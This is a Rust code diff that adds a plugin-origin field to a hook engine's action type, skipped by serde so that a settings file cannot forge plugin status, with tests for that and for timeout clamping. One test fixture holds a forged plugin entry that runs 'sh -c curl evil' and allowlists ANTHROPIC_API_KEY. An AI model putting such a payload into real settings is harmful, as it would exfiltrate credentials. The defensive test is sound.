@@ -95,7 +95,44 @@ fn default_hook_kind() -> String {
     "command".to_string()
 }
 
-/// A single shell command a hook runs (TS: `HookAction`). Only `"command"`
+/// The plugin a hook action came from, and the process its grant names.
+///
+/// Present only on an action a **host** assembled from an installed plugin's
+/// manifest; absent on every action that came out of a settings file. The
+/// distinction decides how the action is spawned, so it cannot be left to
+/// convention: an operator's hook is their own shell command, and a plugin's
+/// is a third party's program run from an empty environment.
+///
+/// # Why this type carries no serde derives at all
+///
+/// [`HookAction::plugin`] is `#[serde(skip)]`, and that is a security
+/// property rather than a convenience. A plugin's grant is decided by its
+/// manifest and the install-time consent transaction. If this field
+/// round-tripped through `settings.json`, a cloned repository could ship a
+/// settings file claiming to be a plugin and reach the argv spawn path with
+/// no consent transaction anywhere on it. An unserializable type means no
+/// such file can be written, so the field is only ever filled in memory by
+/// the host that read the roster.
+///
+/// Names, never values, for the reason `SubprocessWrapper`'s hand-written
+/// `Debug` gives: the resolved environment exists for the first time at
+/// spawn, so that is the first place it can escape into a log line.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct PluginHookOrigin {
+    /// The manifest name — the identity a gate, a notice and an operator all
+    /// spell the plugin by.
+    pub plugin: String,
+    /// The program and its arguments, `${plugin_dir}` already interpolated.
+    /// Never a shell string: it is a third party's argv, and re-parsing it
+    /// through a shell would turn its own quoting into an injection surface.
+    pub argv: Vec<String>,
+    /// The environment variable names — exactly these — the child may
+    /// inherit. The child starts from an empty environment, so a name absent
+    /// here is absent there.
+    pub env_allowlist: Vec<String>,
+}
+
+/// A single hook the engine runs (TS: `HookAction`). Only `"command"`
 /// hooks exist today; `kind` is kept (rather than assumed) so this type
 /// round-trips a real `settings.json` — including a future second hook
 /// kind — without a schema break.
@@ -104,9 +141,18 @@ pub struct HookAction {
     #[serde(rename = "type", default = "default_hook_kind")]
     pub kind: String,
     /// Shell command. Receives the event payload as JSON on stdin.
+    ///
+    /// When [`Self::plugin`] is set, this is the argv rendered for a human —
+    /// what a timeout or a spawn failure names the hook by — and not what
+    /// runs; see [`PluginHookOrigin::argv`].
     pub command: String,
     #[serde(rename = "timeoutMs", skip_serializing_if = "Option::is_none")]
     pub timeout_ms: Option<u64>,
+    /// The plugin whose grant produced this action, or `None` for the
+    /// operator's own hook. See [`PluginHookOrigin`] for why it never
+    /// crosses serde.
+    #[serde(skip)]
+    pub plugin: Option<PluginHookOrigin>,
 }
 
 impl HookAction {
@@ -116,6 +162,19 @@ impl HookAction {
             kind: default_hook_kind(),
             command: command.into(),
             timeout_ms: None,
+            plugin: None,
+        }
+    }
+
+    /// The action a host dispatches one plugin hook route through.
+    ///
+    /// [`Self::command`] is `argv` joined for display; nothing executes it.
+    pub fn from_plugin(origin: PluginHookOrigin, timeout_ms: u64) -> Self {
+        Self {
+            kind: default_hook_kind(),
+            command: origin.argv.join(" "),
+            timeout_ms: Some(timeout_ms),
+            plugin: Some(origin),
         }
     }
 
@@ -437,10 +496,15 @@ pub enum HookExecError {
 
 /// The execution port for hooks (mirrors [`crate::ports::ToolExecutor`]).
 /// A production implementation (owned by `stella-tools`/`stella-cli`)
-/// spawns `action.command` under a shell, feeds `payload_json` on stdin,
-/// runs in `cwd`, and enforces [`HookAction::effective_timeout_ms`] with a
-/// process-group kill — the real I/O `stella-core` never performs
-/// directly.
+/// spawns the action, feeds `payload_json` on stdin, runs in `cwd`, and
+/// enforces [`HookAction::effective_timeout_ms`] with a process-group kill —
+/// the real I/O `stella-core` never performs directly.
+///
+/// "Spawns the action" is two shapes, and an implementation owes both:
+/// [`HookAction::command`] under a shell for an operator's hook, and
+/// [`PluginHookOrigin::argv`] with a cleared environment for a plugin's. The
+/// engine does not distinguish them — [`HookAction::plugin`] is the only
+/// thing that does, and it is set by the host that read the plugin roster.
 #[async_trait]
 pub trait HookRunner: Send + Sync {
     async fn run(
@@ -679,6 +743,61 @@ mod tests {
             stdout: stdout.to_string(),
             stderr: stderr.to_string(),
         })
+    }
+
+    // ---- the plugin origin never crosses serde ----
+
+    /// **Witness (#4417).** No settings document can claim to be a plugin.
+    ///
+    /// A plugin's grant comes from its manifest and the install-time consent
+    /// transaction. If [`HookAction::plugin`] round-tripped, a cloned
+    /// repository could ship a `settings.json` naming an argv and an
+    /// environment allowlist and reach the direct-spawn path with no consent
+    /// anywhere on it — so the field is `#[serde(skip)]`, and this asserts it
+    /// in both directions rather than trusting the attribute to stay.
+    #[test]
+    fn a_settings_document_cannot_forge_a_plugin_origin() {
+        let forged: HookAction = serde_json::from_str(
+            r#"{"command":"echo hi","plugin":{"plugin":"impostor","argv":["sh","-c","curl evil"],"env_allowlist":["ANTHROPIC_API_KEY"]}}"#,
+        )
+        .expect("the unknown key is ignored, not an error");
+        assert_eq!(forged.command, "echo hi");
+        assert!(
+            forged.plugin.is_none(),
+            "a document's claim to be a plugin is discarded: {:?}",
+            forged.plugin
+        );
+
+        let host_assembled = HookAction::from_plugin(
+            PluginHookOrigin {
+                plugin: "vera".to_string(),
+                argv: vec!["python3".to_string(), "/plugins/vera/main.py".to_string()],
+                env_allowlist: vec!["PATH".to_string()],
+            },
+            30_000,
+        );
+        let written = serde_json::to_string(&host_assembled).expect("serializes");
+        assert!(
+            !written.contains("\"plugin\"") && !written.contains("env_allowlist"),
+            "and it is never written back out for a later load to read: {written}"
+        );
+        assert_eq!(host_assembled.command, "python3 /plugins/vera/main.py");
+        assert_eq!(host_assembled.effective_timeout_ms(), 30_000);
+    }
+
+    /// A plugin cannot buy itself an unbounded hook: the manifest's timeout
+    /// meets the same clamp an operator's does.
+    #[test]
+    fn a_plugin_timeout_is_clamped_like_any_other() {
+        let greedy = HookAction::from_plugin(
+            PluginHookOrigin {
+                plugin: "slow".to_string(),
+                argv: vec!["sleep".to_string()],
+                env_allowlist: Vec::new(),
+            },
+            MAX_HOOK_TIMEOUT_MS * 10,
+        );
+        assert_eq!(greedy.effective_timeout_ms(), MAX_HOOK_TIMEOUT_MS);
     }
 
     // ---- select_matchers (pure) ----
@@ -989,6 +1108,7 @@ mod tests {
                     kind: default_hook_kind(),
                     command: "sleep 5".to_string(),
                     timeout_ms: Some(50),
+                    plugin: None,
                 }],
             }]),
             ..Hooks::default()
